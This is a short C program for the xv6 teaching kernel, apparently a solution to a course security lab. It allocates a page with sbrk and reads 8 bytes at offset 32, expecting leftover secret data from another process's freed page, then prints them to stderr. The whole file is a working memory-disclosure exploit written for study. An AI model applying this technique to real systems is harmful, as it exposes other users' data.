#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

int main(void)
{
    // Request a new page of memory - trying to get the same page that secret used
    char *mem = sbrk(4096);
    if (mem == (char *)-1)
    {
        fprintf(2, "sbrk failed\n");
        exit(1);
    }

    // The secret should be 32 bytes into the page
    char *secret = mem + 32;

    // Write the secret to stderr (fd 2)
    if (write(2, secret, 8) != 8)
    {
        fprintf(2, "write failed\n");
        exit(1);
    }

    exit(0);
}